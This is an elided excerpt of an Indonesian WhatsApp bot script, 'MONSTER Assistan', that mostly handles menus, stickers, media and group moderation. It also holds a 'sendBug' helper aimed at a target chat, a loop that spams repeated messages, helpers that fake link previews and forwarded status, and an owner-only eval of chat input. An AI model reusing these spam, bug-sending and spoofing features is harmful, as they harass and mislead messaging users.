...
module.exports = MONSTER = async (MONSTER, mek) => {
try {
        ...
        MONSTER.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
        MONSTER.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
        }
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const typei = Object.keys(mek.message)[0]
		global.prefix
		me = MONSTER.user
		m = simple.smsg(MONSTER, mek)
		...
		MONSTER.on("CB:action,,battery", json => {
		...
		const botNumber = MONSTER.user.jid
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? MONSTER.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = mek.key.fromMe ? MONSTER.user.jid : MONSTER.contacts[mek.sender]
        const pushname = mek.key.fromMe ? MONSTER.user.name : !conts ? '-' : conts.notify || conts.vname || conts.name || '-'   
		const totalchat = await MONSTER.chats.all()
		const groupMetadata = isGroup ? await MONSTER.groupMetadata(from) : ''
...
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
		...
		const katalog = (teks) => {
             res = MONSTER.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© MONSTER Assistan_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             MONSTER.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = MONSTER.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/JI25LDtPW784GAZoRD9fW9', "groupName": `MONSTER Assistan`, "footerText": "*_© MONSTER Assistan_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
            MONSTER.relayWAMessage(grup)
        }
		idttt = []
	    players1 = []
	    players2 = []
		...
		try {
		pporang = await MONSTER.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
...
const sendBug = async (target) => {
      await MONSTER.relayWAMessage(
        MONSTER.prepareMessageFromContent(
          target,
          MONSTER.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
    //But verify
...
MONSTER.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await MONSTER.prepareMessage(from, kma, image)
...
MONSTER.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await MONSTER.prepareMessage(from, kma, video)
const buttonMessages = {
...
kma = gam1
mhan = await MONSTER.prepareMessage(from, kma, location)
const buttonMessages = {
...
if (!mek.key.remoteJid.endsWith('@g.us') && offline){
		  ...
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© MONSTER Assistan_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
		...
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				...
				download(url, namea, async function () {
					...
					MONSTER.sendMessage(to, media, sticker, {quoted: mek})
        ...
        const sendWebp = async(from, url) => {
                ...
                download(url, './temp' + names + '.png', async function () {
                    ...
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        ...
                        MONSTER.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
	        ...
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer MONSTER Assistan\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        MONSTER.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await MONSTER.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        MONSTER.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
			MONSTER.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"DON'T CLICK HERE",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/p/6349482305092740/6281220670449`}}})
		}
		const simir = (teks) => {
			MONSTER.sendMessage(from, teks, text, { quoted:ftrol })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
			MONSTER.sendMessage(hehe, teks, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		//>>>>>>>>STICKER<<<<<<<\\
		const sticOwner = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/owner.webp')
			MONSTER.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		...
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? MONSTER.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : MONSTER.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
MONSTER.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
MONSTER.sendMessage(from, hasil, type, options).catch(e => {
MONSTER.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
  ...
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
				...
				download(url, filename, async function () {
					...
					MONSTER.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
		   ...
		   const sendFakeThumb = async function(from, url, title, desc){
				...
				var qul = await MONSTER.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = dfrply
				MONSTER.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
...
if (!mek.key.fromMe && !isOwner) return
try {
return MONSTER.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
...
reply(String(e))
			...
			for (let anji of setik){
				if (budy === anji){
					...
					MONSTER.sendMessage(from, result, sticker, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					MONSTER.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					MONSTER.sendMessage(from, result, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
    ...
    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 2500) {
        ...
        MONSTER.groupRemove(from, sender);
      }
			}
        if (budy.includes("wa.me/","https://wa.me//","https://wa.me/")) {
        	if (!mek.key.fromMe){
				...
				MONSTER.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Wa.me terdeteksi Auto kick!')
			    MONSTER.groupRemove(from, [kic]).catch((e) => { sticNotAdmin(from) })
            }
        }
			// MUTE
        if (isMuted){
        ...
        if (budy.includes("https://chat.whatsapp.com/")) {
			...
			MONSTER.sendMessage(from, ano, sticker, { quoted: mek})
				}
if (!settings.autoread) {
MONSTER.chatRead(from)
}
if (!settings.autocomposing) {
MONSTER.updatePresence(from, Presence.composing)
}
if (!settings.autorecording) {
MONSTER.updatePresence(from, Presence.recording)
}
if (budy.startsWith('MONSTER')){
sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*_© MONSTERXd_*", [{buttonId: 'igm', buttonText: {displayText: 'Instagram'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
}
if(isButton == 'igm'){
reply('http://instagram.com/MONSTERsadboy')
}
if(isButton == 'ytm'){
reply('http://youtube.com/c/MONSTERXd')
}
   ...
   const sotoy = [
		...
		//runtime berjalan
           runi = process.uptime() 
           MONSTER.setStatus(`Bot Active During ${kyun(runi)} `).catch((_)=>_);
...
mhan = await MONSTER.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
...
MONSTER.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
...
"thumbnail": pporigi,
        ...
        stod = `${sender}`
       stst = await MONSTER.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
       menu = `┌───「 \`\`\`MONSTER Assistan\`\`\` 」
│
🏴‍☠️ _Creator : *MONSTERXd* 
...
│
└───「 \`\`\`MONSTER Assistan\`\`\` 」`
sendButLocation(from, `${menu}`, "*_© MONSTER Assistan_*", {jpegThumbnail:ofrply,name:""}, [{buttonId:`command`,buttonText:{displayText:'BUTTON MENU'},type:1},{buttonId:`owner`,buttonText:{displayText:'DEVELOPER'},type:1},{buttonId:`script`,buttonText:{displayText:'SOURCE CODE'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
break
case 'allmenu': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
if(menuall == false){
   //Masih langka
anu = MONSTER.prepareMessageFromContent(from,{
					"productMessage": {
						"product": {
								"productImage": {
...
mhan = await MONSTER.prepareMessage(from, pporigi, image, {thumbnail: pporigi})
const btnBngsat = {
imageMessage: mhan.message.imageMessage,
contentText: `${menunya}`,
footerText: `MONSTER Assistan`,
buttons: gbutsan,
headerType: 4
}
MONSTER.sendMessage(from, btnBngsat, MessageType.buttonsMessage, { quoted: ftrol, caption: menunya, contextInfo: { mentionedJid: [dtod,otod,stod]}})
                  }
break
        case 'store':
        reply('*STORE MENU*\nREADY RDP BY MONSTERXd\n SPEK:\n RAM 8GB CORE 2\n35k minat ketik .owner')
        break
case 'verify':
...
MONSTER.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:ftrol, contextInfo: { mentionedJid: [sender]}})
...
case 'command':
 ...
 footerText: '*_© MONSTER Assistan_*',
...
MONSTER.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:ftrol})
break
case 'ownermenu':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
menu = `❏ 「 \`\`\`MENU OWNER\`\`\` 」
...
MONSTER.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
break
case 'nuliskanan':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!c) return reply('Textnya mana gan?')
...
MONSTER.sendMessage(from, asu, video, { quoted: mek})
break
case 'asupan2':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  sticWait(from)
...
MONSTER.sendMessage(from, ano, video, { quoted: mek})
break
case 'asupant3':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  sticWait(from)
...
ano = await getBuffer(anu.result.url)
MONSTER.sendMessage(from, ano, image, { quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
break
       case 'maker3d': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} MONSTER Assistan`)
					teksnya = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://xnxxapi.herokuapp.com/api/maker3d?text=${teksnya}&apikey=xnxx`)
					buffer1 = await getBuffer(anu.result.results)
					MONSTER.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
					break
...
mhan = await MONSTER.prepareMessage(from, buff, image, {thumbnail: buff})
...
MONSTER.sendMessage(from, buttonMessagessss, MessageType.buttonsMessage, {
...
//🐀💰 MALING
  ...
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					owgi = await  MONSTER.downloadAndSaveMediaMessage(ger)
					...
					MONSTER.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
  ...
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, buffer, image, {quoted: mek})
                   }
              break       
		case 'gay':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  ...
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })              
					break
case 'igstalk':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
MONSTER.sendMessage(from, nih_buff, image, { quoted: mek, caption: tt });
}
break;      
break    
                case 'bisakah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					break
				case 'kapankah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					break
         			  case 'apakah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					apakah = body.slice(1)
					...
					MONSTER.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					break
				case 'rate':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					rate = body.slice(1)
					...
					MONSTER.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					break
		    case 'tiktokaudio':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	...
	MONSTER.sendMessage(from,nowmm ,MessageType.audio,{mimetype:'audio/mp4',quoted: mek})
		})
		})
		break 
	case 'igstory': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            ...
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    ...
                    MONSTER.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    MONSTER.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
...
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ...
            MONSTER.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case 'komiku':
    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
MONSTER.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'audio.mp3', quoted:mek, ptt:true})
})
break
    case 'chara':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            ...
            await MONSTER.sendMessage(from,li,image,{quoted: mek})
            break
//Navi
					          case 'unpin':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                MONSTER.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
            case 'pin':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                MONSTER.modifyChat(from, ChatModification.pin)
             ...
             case 'archive':
                ...
                await sleep(3000)
                MONSTER.modifyChat(from, ChatModification.archive)
                break
            case 'unreadall':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                var chats = await MONSTER.chats.all()
                chats.map( async ({ jid }) => {
                await MONSTER.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await MONSTER.sendMessage(from, teks, text, {quoted: mek})
		...
		break
            case 'unarchiveall':
                ...
                anu = await MONSTER.chats.all()
                for (let _ of anu) {
                MONSTER.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
case 'tutuptime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
MONSTER.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
setTimeout( () => {
var nomor = mek.participant
MONSTER.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
case 'leavetime':
if (!isGroup) return reply(mess.only.group)
...
const skuygelud = {
    contentText: `${anu}`,
    footerText: '*_©MONSTER_*',
    buttons: buttons,
    headerType: 1
}
await MONSTER.sendMessage(from, skuygelud, MessageType.buttonsMessage, {quoted: ftrol})
}
break
case 'setallmenu':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
...
await MONSTER.sendMessage(from, skuygf, MessageType.buttonsMessage, {quoted: ftrol})
}
break
//Sampai sini
case 'jadibot':
...
const vname = MONSTER.contacts[i] != undefined ? MONSTER.contacts[i].vname || MONSTER.contacts[i].notify : undefined
ini_list.push({
"displayName": `Developer MONSTER Assistan`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;${NamaOwner};;;\nFN:${vname ? `${vname}` : `${NamaOwner}`}\nitem1.TEL;waid=${NomorOwner}:${NomorOwner2}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
MONSTER.sendMessage(from, {
"displayName": `Developer MONSTER Assistan`,
"contacts": ini_list 
...
await MONSTER.sendMessage(from, btnskuy, MessageType.buttonsMessage, {quoted: ftrol})
		break
case 'donasi':
...
MONSTER.sendMessage(from, dona, image, { quoted: ftrol, thumbnail: dona, caption: doni })
break
       case 'debug':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			 res = await MONSTER.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
							"hydratedFooterText": `MONSTER Assistan`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
...
"templateMessage": {
  ...
  "hydratedTemplate": {
    ...
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script MONSTER Assistan`,
          "url": "https://github.com/MONSTERXd"
        },
        "index": 0
      }
    ]
...
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            ...
            owgi = await MONSTER.downloadMediaMessage(boij)
...
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    ...
    let qse = MONSTER.serializeM(await m.getQuotedObj())
...
case 'listgroup':
                ...
                case 'grouplist':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  const txs = MONSTER.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${MONSTER.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
  case 'caripesan':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
cok = await MONSTER.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
MONSTER.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
...
await MONSTER.sendMessage(from, btnharam, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
                case 'antidelete':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
...
await MONSTER.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
                case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
...
MONSTER.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*
...
break
		...
		try {
					ppimg = await MONSTER.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await MONSTER.getProfilePicture(anu)
...
await MONSTER.sendMessage(from, buMess, MessageType.buttonsMessage, {quoted: ftrol})
break
				case 'public':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
			publik = true
...
if (error){ return reply('_[ ! ] Error TerMONSTERi Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
...
break
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					...
					MONSTER.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					case 'infogempa':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
				case 'dadu':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			MONSTER.sendMessage(from, damdu, sticker, {quoted: mek})
			break
				case 'robot':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await MONSTER.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
MONSTER.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					mediaz = await MONSTER.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					MONSTER.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
	...
	mediau = await MONSTER.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
...
case 'bass':                 
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					mediao = await MONSTER.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
...
case 'sider':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
infom = await MONSTER.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
...
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  MONSTER.sendMessage(from, `${oi1}`, MessageType.text)
	  }
...
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  ...
	  MONSTER.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await MONSTER.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  MONSTER.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await MONSTER.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  MONSTER.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await MONSTER.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  MONSTER.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	case 'halloween':
...
case 'matrix':
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				case 'del':
				case 'delete':
					MONSTER.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await MONSTER.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    MONSTER.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                ...
                await sleep(4000)
                MONSTER.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					anu = await MONSTER.chats.all()
					MONSTER.setMaxListeners(10)
					for (let _ of anu) {
						MONSTER.clearMessage(_.jid)
					}
                ...
                break
					case 'restart':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
reply(`_Restarting MONSTER Assistan_`)
exec(`cd &&  node index`)
sleep(4000)
reply('Sukses')
break
...
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await MONSTER.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						MONSTER.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					...
					hah = fs.readFileSync(median)
						MONSTER.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
			...
			if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (args[0] === 'on') {
						...
						MONSTER.sendMessage(from, `ALLERT!!! Group ini sudah di pasang antivirtex\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
...
